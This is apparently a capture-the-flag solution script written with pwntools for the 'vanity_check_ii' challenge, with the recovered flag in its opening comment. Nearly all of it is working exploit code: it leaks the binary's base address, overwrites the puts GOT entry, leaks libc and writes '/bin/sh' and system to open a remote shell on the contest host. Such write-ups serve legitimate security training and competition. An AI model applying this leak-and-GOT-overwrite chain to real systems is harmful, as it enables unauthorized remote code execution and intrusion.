# idek{c0ntr1v3d_g0t_0v3rwr1te_but_b3_c4r3fu1_w1th_str1ngs!}
from pwn import *

elf = ELF("./vanity_check_ii")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

target = elf.process()#([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("vanity-check-ii.chal.idek.team", 1337)

def s(d):
    target.send(d)

s("A"*0x20 + "\x30")
target.recvuntil("A"*0x10)
elf.address = u64(target.recvline().strip().ljust(8, '\x00')) - 0x3430

s("B"*0x10 + p64(elf.got['puts'] - 8))

raw_input("Continue?")
#gdb.attach(target)
s("C"*8)
target.recvuntil("C"*8)
libc.address = u64(target.recvline().strip().ljust(8, '\x00')) - libc.sym['puts']

s("/bin/sh\x00" + p64(libc.sym['system']))

target.interactive()